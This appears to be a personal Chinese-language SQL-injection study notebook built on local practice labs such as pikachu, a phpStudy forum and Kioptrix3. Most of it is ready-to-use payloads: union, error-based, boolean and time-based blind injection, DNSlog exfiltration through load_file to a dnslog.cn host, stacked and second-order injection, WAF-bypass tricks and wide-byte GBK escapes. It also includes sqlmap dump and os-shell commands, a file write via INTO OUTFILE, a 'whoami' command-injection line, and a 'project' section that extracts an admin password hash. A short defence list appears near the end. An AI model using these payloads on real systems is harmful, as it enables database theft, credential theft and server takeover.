http://localhost/wzry/index.html
==注意：phpstudy php+apache版本号，太低会失败==

pass = '' or '1' = '1';
' or '1' = '1

`http://localhost/wzry/url.php?date=20231012' union SELECT database(),'','','`



==判断是否有注入点：==
1、更换 id 看到查询的是不同的数据
2、使用 order by 查询回显列数：使用 order by 能获得当前查询有几个字段，为后面 union 提供依据，order by m
3、判断显示位置：id=-1 union select 1,2,3,4
4.获得数据库名字
id=-1 union select 1,2,version(),database()

==查库、表、用户：==
`http://localhost/wzry/url.php?date=20231012'   union select database(),version(),user(),'`

==查表：==
`http://localhost/wzry/url.php?date=20231012' union SELECT (select GROUP_CONCAT(TABLE_name ) from information_schema.TABLES t where t.TABLE_SCHEMA='game'),'','','`

==查表字段：==
`http://localhost/wzry/url.php?date=20231012' union SELECT
  (select GROUP_CONCAT(c.COLUMN_NAME ) from information_schema.COLUMNS c where
  c.TABLE_SCHEMA='game' and c.TABLE_NAME='user'),'','','`

==查看数据==
date=20231012'  union SELECT username,password,333,444  from user where '1'='1
date=20231012'  union SELECT 111,222,333,concat(username,':',password) from user where '1'='1


BBS
```
http://localhost/bbs/showmessage.php?id=-1' 或者”啊“
id=-1 union select 1,2,3,4

使用 order by 查询回显列数:
http://localhost/bbs/showmessage.php?id=-1 order by 1  


```
==查询数据库==

id=-1 union select 1,2,3,(select group_concat(schema_name) from information_schema.schemata)
id=-1 union select 1,2,3,group_concat(schema_name) from information_schema.schemata

==获得数据库里面的表：==
id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='jrlt'

==获得数据库对应表中的所有字段：==
id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='jrlt'

==获得字段的数据：==
?id=-1 union select 1,2,3,concat(name,':',password) from users limit 0,1



==`============报错注入：=====================================`==

==group by 重复键冲突== ：
count()+floor()+rand()+group by 组合）就是利用 count()、rand()、floor()
group by 这几个特定的函数结合在一起产生的注入漏洞
`id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1) ,0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)`

==xpath 报错==
id=1 and extractvalue(1, concat(0x5c, (select version()),0x5c))
其中 extractvalue()函数语法、参数定义及作用如下：
从目标 XML 中返回包含所查询值的字符串
● 第一个参数:XML_document 是 String 格式，为 XMIL 文档对象的名称。
● 第二个参数:XPath_string (Xpath 格式的字符串)。
==`SELECT extractvalue('<root><username>luojie</username><age>18</age></root>', '//username')`==

==updatexml 报错==
?id=1 and updatexml(1,concat(0x5e,(select version()),0x5e),1)
updatexml(xml_document,xpath_string,new_value)
第一个参数:XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc1
第二个参数: XPath_string (Xpath 格式的字符串)，如果不了解 Xpath 语法，可以在网上查找教程。
第三个参数: new_value，String 格式，替换查找到的符合条件的数据。
`SELECT updatexml('<root><username>luojie</username><age>18</age></root>','//username','<name>luojiejie</name>')`

==实战：新增方式==
http://localhost/bbs/addMessage.php
==获得数据库名字==
`'or (select 1 from (select count(*),concat(0x5e,(select database() from information_schema.tables limit 0,1) ,0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a) or'`

==获得数表名==
==' or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema='jrlt'),0x5c)) or '==

==获得表的字段==
`' or updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='jrlt'),0x5e),1) or '`

==获得数据==
' or updatexml(1,concat(0x5e,(select concat(name,':',password) from users limit 0,1),0x5e),1) or '
发现结果显示出来，但数据不对，原因是 updataxml()对仅能获取返回 32 位字符，对于长字符串需要分批次获取获得数据库名字：

==' or updatexml(1,concat(0x5e,(select concat(name,':',substring(password,1,16)) from users limit 0,1),0x5e),1) or '==

==' or updatexml(1,concat(0x5e,(select concat(name,':',substring('21232f297a57a5a743894a0e4a801fc3',17)) from users limit 0,1),0x5e),1) or '==


==布尔注入==
1.判断是否存在布尔注入
使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入
注意：这里使用 union 或报错注入会更容易，这里只是通过案例学习
?id=2 and 1=1
?id=2 and 1=2
2.获得数据库名
获得数据库名字长度
?id=1 and length(database())<5
?id=1 and length(database())>2
?id=1 and length(database())=4

b.获得数据库的名字
数据库的名字一般都是 a-z,A-Z 组成，也可能出现数字、下划线等字符，当现在已经长度为 4
可以使用 ASCII 码，甄别出数据库每一个字符
?id=1 and ascii(substr(database(),1,1))<123
#122 为 z
?id=1 and ascii(substr(database(),1,1))>64 #65 为 A
?id=1 and ascii(substr(database(),1,1))>100 #true
?id=1 and ascii(substr(database(),1,1))>110 #false
?id=1 and ascii(substr(database(),1,1))=106 #j
-- 同样方法
?id=1 and ascii(substr(database(),2,1))=114 #r
?id=1 and ascii(substr(database(),3,1))=108 #l
?id=1 and ascii(substr(database(),4,1))=116 #t
3.获得数据库有哪些表
?id=1 and (select count(table_name) from information_schema.tables where table_schema =database())<5
?id=1 and (select count(table_name) from information_schema.tables where table_schema =database())<2
?id=1 and (select count(table_name) from information_schema.tables where table_schema =database())=2
b.获得某个表的长度
?id=1 and length((select table_name from information_schema.tables where
table_schema=database() limit 0,1))<10
?id=1 and length((select table_name from information_schema.tables where
table_schema=database() limit 0,1))<5
?id=1 and length((select table_name from information_schema.tables where
table_schema=database() limit 0,1)) = 8
c.获得某个表名称
第一个字符
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<100
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120
#m
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109
4.获得表有哪些字段
a.获得 user 表列数
?id=1 and (select count(column_name) from information_schema.columns where
table_schema=database() and table_name='users')=5
b.获得第一个字段的长度
?id=1 and length((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1))<10
?id=1 and length((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1))<1
?id=1 and length((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1))=2
 c.获得第一个字段的名称
?id=1 and ascii(substr((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1),1,1))<100
?id=1 and ascii(substr((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1),1,1))<110
?id=1 and ascii(substr((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1),1,1))=105
?id=1 and ascii(substr((select column_name from information_schema.columns where
table_schema=database() and table_name='users' limit 0,1),2,1))=100
5.获得字段的真实内容
a.获得 user 字段第一行数据的内容长度
?id=1 and (select LENGTH(name) from users LIMIT 0,1)=5
b.获得 user 字段第一行数据第一个字符内容
?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97 # a
?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100 # d

==延迟盲注==
使用条件union，报错、布尔等搞不定的时候才考虑，效率极低
1.判断是延迟注入点
?id=1 and sleep(5)
2.获得数据库名字
a.获得数据库名字长度
?id=1 and if(length(database())<10,sleep(5),1)
?id=1 and if(length(database())<3,sleep(5),1)
?id=1 and if(length(database())=4,sleep(5),1)

b.获得数据库名第一个字符
?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)
?id=1 and if(ascii(substr(database(),2,1))=106,sleep(5),1)
?id=1 and if(ascii(substr(database(),3,1))=106,sleep(5),1) #l
?id=1 and if(ascii(substr(database(),4,1))=106,sleep(5),1) #t

3.获得表名
?id=1 and if(ascii(substr((select table_name from information_schema.tables where
table_schema =database() limit 0,1),1,1))=109,sleep(5),1)
?id=1 and if(ascii(substr((select table_name from information_schema.tables where
table_schema =database() limit 0,1),2,1))=101,sleep(5),1)



==DNSlog 盲注==
DNSlog 盲注就是通过 load_file 函数发起请求，然后去 DNSlog 平台接收数据，需要用到 load_file 函数就是需要用到 root用户读写文件的功能
读写文件
开启读写文件功能
1.查看配置
show VARIABLES like 'secure_file_priv'
![[Pasted image 20241031093554.png]]

2.修改配置文件，并重启
\phpStudy\PHPTutorial\MySQL\my.ini
secure_file_priv=

读写文件实战
读取获得网站路径
?id=-1 union select 1,2,3,@@datadir

发现使用的是 phpStudy，可以读取"C:\Users\86188\Desktop\tool\phpStudy\PHPTutorial\Apache\conf\vhosts.conf" 获得站
点路径
`http://localhost/bbs/showmessage.php?id=-1 union select 1,2,load_file('D:\\2024\\phpStudy2018\\PHPTutorial\\WWW\\bbs\\index.php'),4`


写入文件
`?id=-1 union select 1,2,3,'<?php phpinfo();?>' into outfile "C:\\Users\\86188\\Desktop\\tool\\phpStudy\\PHPTutorial\\WWW\\bbs\\test.php"`

总结：获得网站目录的方式
1.使用遗留文件：phpinfo.php
2.使用各种配置文件
3.使用错误或警告信息

实战
回到 DNSlog 知识，这个需要有文件读取的权限，如果有着权限又不需要使用 DNSLOGS 来完成注入的
http://dnslog.cn/
获得数据库名字
?id=1 and load_file(concat('//',(select database()),'.kudtfu.dnslog.cn/123'))
获得当前数据库的表
?id=1 and load_file(concat('//',(select table_name from information_schema.tables where    table_schema=database() limit 0,1),'.kudtfu.dnslog.cn/123'))





==二次注入==
根据已经获得的 admin 用户注册新的的用户
admin'#
然后修改 admin'#用户的密码
查询数据发现自己的密码没变，但 admin 的密码被修改了





==堆叠注入==
在 SQL 数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句
之间以分号隔开）的注入方式
在 SQL 数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句
之间以分号隔开）的注入方式
构建攻击语句
?id=2;insert into users (name,password) values('luojie',md5('admin'));

## ==SQL 注入绕过==
```
?id=-1 union select 1,2,3,database/**/()
?id=-1 /**&id=-1 union select 1,2,3,database()%23*/   #亲测生效
?id=-1 /**&id=-1 union select 1,2,3,database/**/()%23*/  
数据库特性
实战
?id=-1%20union%20/*!44509select*/%201,2,3,4
原理
具体的数字要去测试
?id=-1 union /*!44509select*/ 1,2,3,/*!44509database/**/()*/#  #亲测生效

```

/**&id=-1 union select 1,2,3,3%23*/

## ==SQLMap==
通过exploit database搜索得知，gallarific的gallery.php页面存在sql注入漏洞
sqlmap --purge
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --tables



sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T gallarific_users
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T dev_accounts


获得gallery数据库下的表名:sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery --tables --batch
获取dev_accounts表的数据：sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery -T dev_accounts --dump --batch

`sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' -D jrlt -T users --columns`

`sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' -D jrlt -T users -C name,password --dump`
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --current-db

sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --sql-shell
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --password
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --os-shell
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --file-read "D:\e.txt"



==SQLMap 绕过==
使用 tamper
参考：https://github.com/w0x68y/bypassWAF/tree/
passdog.py上传到目录
cd /usr/share/sqlmap/tamper/
执行 sqlmap
sqlmap --purge
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --tamper=passdog.py --random-agent --dbs
备注：可能会绕不过





==SQL 注入防护==
1.过滤：
a.限制参数长度
b.识别恶意代码（union 、 order by 、update、select）
2.转义：
直接把用户的输入当成文本
3.数据库安全控制：
a.权限
b.敏感数据加密
4.预编译



==`==================pikachu手动查询：================================`==
Post:
id=-1 order by 2
id=-1 union select 1,2
id=-1 union select database(),version()
id=-1 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'
id=-1 union select group_concat(column_name),2 from information_schema.columns where
table_schema='pikachu' and table_name='users'
id=-1 union select group_concat(username),group_concat(password) from users

搜索：
?name=1%' order by 3 -- +&submit=查询
?name=1%' union select 1,database(),version() -- +&submit=查询
?name=1%' union select group_concat(table_name),2,3 from information_schema.tables where
table_schema='pikachu' -- +&submit=查询
?name=1%' union select group_concat(column_name),2,3 from information_schema.columns where table_schema='pikachu' and table_name='users' -- +&submit=查询
?name=1%' union select group_concat(username),group_concat(password),3 from users --
+&submit=查询

xx:
1%' ) union select 1,2#
1%' ) order by 2#

insert/update注入:
' and extractvalue(1,concat(0x7e,(database()))) and '1'='1
' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from
information_schema.tables where table_schema='pikachu' ))) and '1'='1
' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
information_schema.columns where table_schema='pikachu' and table_name='users'))) and
'1'='1
' and extractvalue(1,concat(0x7e,(select concat(username,'-',password) from users limit
0,1))) and '1'='1

delete 注入
?id=1 and extractvalue(1,concat(0x7e,(database())))
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from
information_schema.tables where table_schema='pikachu' )))
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
information_schema.columns where table_schema='pikachu' and table_name='users')))
?id=1 and extractvalue(1,concat(0x7e,(select concat(username,'-',password) from users
limit 0,1)))


http header 注入
User-Agent:'


==盲注==：
布尔盲注
也可以union
-1' union select database(),version()

kobe' and length(database())<8#
kobe' and ascii(substr(database(),1,1))=112#
kobe' and ascii(substr(database(),1,1))=112 -- +

延迟盲注
lucy' and if(length(database())<10,sleep(5),1)#

==宽字节注入==
概述 背景
在 php 中提供了一一系列函数（preg_replace，addslashes，mysql_real_escape_string
等），可以把传过来的'号转为\'，防止而已的注入，这个时候如果数据库正使用的是 gbk，
就可以使用宽字节注入的方式绕过。
适用情形
（1）数据库的编码格式为 GBK（SET NAMES 'gbk’或是 SET character_set_client =gbk）；
（2）在 PHP 中，对提交的数据进行了单引号、双引号、\等的转义。

宽字节
GBK 采用双字节表示，就是两个字节代表一个汉字，当首字节为为 81~ FE 之内时，程序会继
续向后取一个字节，如果尾字节在 40~FE 范围内，则程序会认为该字符为双字节编码
![[Pasted image 20241031150357.png]]

可见 GBK 编码采用的是 16 进制
1、在注入点输入（'）会被转义为（\'）编码后为（%5c%27），只有把斜杆去掉才能注入
2、GBK 编码表，%DF%5C 正好组成（ 運），所以会把\"吃掉"
转义字符\的编码为 5c，正好在 GBK 编码范围之内，加入在编码范围内的字节与\构成
GBK 编码的汉子，从而使转义符\失效，实现了单引号或双引号逃逸

burpSuite:
1%df' union select user(),database()#    -- +

=======================================================


============================================================

' order by 2#
’) union select 1,2#
' union select database(),user()#

admin' and if(1=1,sleep(2),1)#
127.0.0.1;whoami


```
特殊符号
/**/
/***/
#
-- +
```






==============================================================================================================================

==04项目实战：==

AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) AND 'VrnL'='VrnL
AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables  where table_schema='www_example1_com'  limit 1 offset 0),0x7e),1) AND '1'='1
AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables  where table_schema='www_example1_com'  limit 1 offset 1),0x7e),1) AND '1'='1
AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables  where table_schema='www_example1_com'  limit 1 offset 0),0x7e),2) AND '1'='1
#webshop_admin

AND updatexml(1,concat(0x7e,(select column_name from information_schema.columns  where table_schema='www_example1_com'  limit 1 offset 0),0x7e),2) AND '1'='1

AND updatexml(1,concat(0x7e,(select admin_name from iwebshop_admin  limit 1 offset 0),0x7e),2) AND '1'='1

AND updatexml(1,concat(0x7e,(select password from iwebshop_admin  limit 1 offset 0),0x7e),2) AND '1'='1
AND updatexml(1,concat(0x7e,(select substr(password,32,31) from iwebshop_admin  limit 1 offset 0),0x7e),2) AND '1'='1
#0192023a7bbd73250516f069df18b500

update users set password=md5('123456') where name='admin'#'

admin' or '1'='1
admin' or 1=1 #

